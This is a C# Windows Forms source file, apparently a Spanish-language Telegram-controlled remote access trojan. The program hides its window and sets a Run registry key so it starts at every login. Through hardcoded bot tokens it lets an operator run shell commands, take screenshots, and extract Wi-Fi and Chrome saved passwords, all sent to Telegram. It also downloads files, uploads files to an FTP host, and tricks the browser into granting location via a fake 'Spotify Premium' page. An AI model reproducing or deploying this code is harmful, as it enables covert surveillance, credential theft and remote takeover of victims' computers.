using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Windows.Forms;
using Telegram.Bot;

namespace TestingTelegramBot
{
    public partial class Form1 : Form
    {

        string Commands()
        {
            return
                   "/Screenshot\n"                       +
               //  "/SnapShot\n"                         +
                   "/WifiSSID\n"                         +
                   "/Passwords\n"                        +
                   "/Directory\n"                        +
                   "/Download [URL] [NAME.FORMAT]\n"     +
                   "/Upload [DIC] [Nombre]\n"            +
                   "/DWStatus\n"                         +
                   "/Location\n"                         +
                   "/GetLocation\n"                      +
                   "/ProcessList\n"                      +
                   "/CMD [COMMAND]";
        }
        public Form1()
        {
            InitializeComponent();

            String info = String.Format("Inicio de sesión: {0} \nNombre del equipo: {1}\n\n", Environment.MachineName, DateTime.Now.ToString("MM/dd/yyyy HH:mm"));

            Download_SourceCode("https://api.telegram.org/bot1014584343:AAEVfgIj5OYLvNHeKs917z_GZ0gnwMs559s/sendMessage?chat_id=347433494&text=" + info + Commands());

            Bot.OnMessage += Bot_OnMessage;
            Bot.StartReceiving();
        }

        protected override void OnLoad(EventArgs e)
        {
            Visible = false;
            ShowInTaskbar = false;
            Opacity = 0;
            base.OnLoad(e);
        }


        TelegramBotClient Bot = new TelegramBotClient("1087612546:AAFYN89hKT9YKdv5onSjLhJaoF8ptFOdIhE");

        // Screenshot
        public Image Screenshot()
        {
            Bitmap CapturaBitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
            Graphics CF = Graphics.FromImage(CapturaBitmap);
            CF.CopyFromScreen(0, 0, 0, 0, CapturaBitmap.Size);
            return (Image)CapturaBitmap;
        }


        // SSID Wifi + Password
        public String SSID()
        {
            // SSID
            try
            {
                System.Diagnostics.Process netsh1 = new System.Diagnostics.Process();
                netsh1.StartInfo.FileName = "netsh.exe";
                netsh1.StartInfo.Arguments = "wlan show interfaces";
                netsh1.StartInfo.UseShellExecute = false;
                netsh1.StartInfo.CreateNoWindow = true;
                netsh1.StartInfo.RedirectStandardOutput = true;
                netsh1.Start();

                string OutPutOne = netsh1.StandardOutput.ReadToEnd();

                string SSID_Name = OutPutOne.Substring(OutPutOne.IndexOf("SSID"));
                SSID_Name = SSID_Name.Substring(SSID_Name.IndexOf(":"));
                SSID_Name = SSID_Name.Substring(2, SSID_Name.IndexOf("\n")).Trim();

                // Password
                try
                {

                    System.Diagnostics.Process netsh2 = new System.Diagnostics.Process();
                    netsh2.StartInfo.FileName = "netsh.exe";
                    netsh2.StartInfo.Arguments = "wlan show profiles \"" + SSID_Name + "\" key=clear";
                    netsh2.StartInfo.UseShellExecute = false;
                    netsh2.StartInfo.CreateNoWindow = true;
                    netsh2.StartInfo.RedirectStandardOutput = true;
                    netsh2.Start();

                    string OutPutTwo = netsh2.StandardOutput.ReadToEnd();

                    string Password_Wifi = OutPutTwo.Substring(OutPutTwo.IndexOf("Contenido de la clave"));
                    Password_Wifi = Password_Wifi.Substring(Password_Wifi.IndexOf(":"));
                    Password_Wifi = Password_Wifi.Substring(2, Password_Wifi.IndexOf("\n")).Trim();

                    return String.Format("SSID: {0}\nPassword: {1}", SSID_Name, Password_Wifi);

                }
                catch { return String.Format("SSID: {0}\nPassword: Not found", SSID_Name); }

            }
            catch { return String.Format("SSID: Not found"); }
        }

        // Windows SHELL
        private String CMD(string argv)
        {
            try
            {
                System.Diagnostics.Process CMD = new System.Diagnostics.Process();
                CMD.StartInfo.FileName = "cmd.exe";
                CMD.StartInfo.Arguments = @"/c " + argv;
                CMD.StartInfo.UseShellExecute = false;
                CMD.StartInfo.CreateNoWindow = true;
                CMD.StartInfo.RedirectStandardOutput = true;
                CMD.Start();

                string output = CMD.StandardOutput.ReadToEnd();

                return output.Length > 0 && output != null ? String.Format("{0}", output) : String.Format("Ejecución sin output disponible.");
            }
            catch
            {
                return String.Format("Comando incorrecto");
            }
        }

        // Download
        bool check = false;
        private void Download(string url_descarga, string nombre)
        {
            WebClient Descarga = new WebClient();
            Descarga.DownloadFileCompleted += new AsyncCompletedEventHandler(DescargaCompletada);

            string ruta_descarga = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\" + nombre;
            Descarga.DownloadFileAsync(new Uri(url_descarga), ruta_descarga);
        }

        // Donwload has been completed
        private void DescargaCompletada(object sender, AsyncCompletedEventArgs n)
        {
            try { check = true; } catch { check = false; }
        }


        // Upload
        void Upload_This(string ruta, string name)
        {

                WebClient client = new WebClient();
                client.Credentials = new NetworkCredential("usuario", "contraseña");
                client.UploadFile("ftp://files.000webhost.com/public_html/" + name, WebRequestMethods.Ftp.UploadFile, ruta);

        }

        // DownloadSource
        string Download_SourceCode(string url)
        {
            System.Net.WebClient Scraping = new WebClient();
            Scraping.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0");
            return Scraping.DownloadString(url);
        }


        // Main 
        private void Bot_OnMessage(object sender, Telegram.Bot.Args.MessageEventArgs e)
        {
            if (e.Message.Type == Telegram.Bot.Types.Enums.MessageType.Text)
            {
                if (e.Message.Text.StartsWith("/CMD") && e.Message.Text.Length > 4)
                {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, CMD(e.Message.Text.Substring(5, e.Message.Text.Length - 5)));

                }
                else if (e.Message.Text.StartsWith("/Download"))
                {
                    try
                    {
                        List<string> argv = e.Message.Text.Split(' ').ToList<string>();
                        Download(argv[1], argv[2]);
                    }
                    catch { Bot.SendTextMessageAsync(e.Message.Chat.Id, "Error en el comando y/o archivo a descargar."); }
                }
                else if (e.Message.Text.StartsWith("/Upload"))
                {
                    try
                    {
                        List<string> argv = e.Message.Text.Split('|').ToList<string>();
                        Upload_This(argv[1], argv[2]);
                        Bot.SendTextMessageAsync(e.Message.Chat.Id, "Subido correctamente.");
                    }
                    catch { Bot.SendTextMessageAsync(e.Message.Chat.Id, "Error en el comando y/o archivo a subir."); }
                }
                else
                {
                    switch (e.Message.Text)
                    {
                        case "/Screenshot":
                            using (Image img = Screenshot())
                            {
                                img.Save(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\Pic.png", System.Drawing.Imaging.ImageFormat.Png);

                                FileStream fs = System.IO.File.Open(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\Pic.png", FileMode.Open);

                                Telegram.Bot.Types.InputFiles.InputOnlineFile s = new Telegram.Bot.Types.InputFiles.InputOnlineFile(fs);
                                Bot.SendPhotoAsync(e.Message.Chat.Id, s);
                            }
                            break;

                        case "/WifiSSID":
                            Bot.SendTextMessageAsync(e.Message.Chat.Id, SSID());
                            break;

                        case "/DWStatus":
                            if (check) { check = false; Bot.SendTextMessageAsync(e.Message.Chat.Id, "Descarga completada"); }
                            else Bot.SendTextMessageAsync(e.Message.Chat.Id, "Aún no se ha completado la descarga");
                            break;

                        case "/Directory":
                            Bot.SendTextMessageAsync(e.Message.Chat.Id, Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
                            Console.WriteLine(e.Message.Chat.Id);
                            break;

                        case "/Location":
                            Process.Start("chrome.exe", "https://getspotifypremium.000webhostapp.com/");
                            int Segundos_actuales = Convert.ToInt32(DateTime.Now.ToString("ss"));
                            int comparar = Segundos_actuales + 5;

                            switch (Segundos_actuales)
                            {
                                case 55: comparar = 0; break;
                                case 56: comparar = 1; break;
                                case 57: comparar = 2; break;
                                case 58: comparar = 3; break;
                                case 59: comparar = 4; break;
                            }

                            int X = Cursor.Position.X;
                            int Y = Cursor.Position.Y;

                            while (comparar != Convert.ToInt32(DateTime.Now.ToString("ss")))
                            {
                                System.Windows.Forms.Cursor.Position = new Point(
                                  X,
                                  Y
                                );
                            }
                            SendKeys.SendWait("+{TAB}");
                            SendKeys.SendWait("+{TAB}");
                            SendKeys.SendWait("{ENTER}");

                            Bot.SendTextMessageAsync(e.Message.Chat.Id, "Comando ejecutado correctamente");
                            break;

                        case "/GetLocation":
                            try
                            {
                                Bot.SendTextMessageAsync(e.Message.Chat.Id, Download_SourceCode("https://getspotifypremium.000webhostapp.com/location.html"));
                            }
                            catch
                            {
                                Bot.SendTextMessageAsync(e.Message.Chat.Id, "Localización no disponible");
                            }
                            break;

                        case "/Passwords":
                            try
                            {
                                List<IPassReader> readers = new List<IPassReader>();
                                readers.Add(new ChromePassReader());

                                foreach (var reader in readers)
                                {
                                    try
                                    {
                                        foreach (var d in reader.ReadPasswords())
                                        {
                                            Bot.SendTextMessageAsync(e.Message.Chat.Id, ($"{d.Url}\r\n\tU: {d.Username}\r\n\tP: {d.Password}\r\n"));
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        Bot.SendTextMessageAsync(e.Message.Chat.Id, "Error");
                                    }
                                }
                            }
                            catch
                            {
                                Bot.SendTextMessageAsync(e.Message.Chat.Id, "Error");
                            }
                            break;


                        case "/SnapShot":
                            break;

                        case "/ProcessList":
                            // Se deja los 3 últimos processos por alguna razón.
                            string list = "";
                            Process[] processlist = Process.GetProcesses();

                            foreach (Process theprocess in processlist)
                            {
                                list += String.Format("Process: {0} ID: {1}\n", theprocess.ProcessName, theprocess.Id);
                            }

                            int n = list.Length;
                            while (n >= 0)
                            {
                                int t = 0;
                                if (n <= 4096) { Bot.SendTextMessageAsync(e.Message.Chat.Id, list.Substring(t, list.Length)); break; }
                                if (n >= 4096)
                                {
                                    Bot.SendTextMessageAsync(e.Message.Chat.Id, list.Substring(t, 4096));
                                    t += 4096;
                                    n -= 4096;
                                }

                            }
                            break;

                        default:
                            Bot.SendTextMessageAsync(e.Message.Chat.Id, Commands());
                            break;
                    }
                }
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.SetValue("SystemWin", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\Microsoft___64\KilledProcess.exe");
            }
            catch
            {
            }
        }
    }
}
   
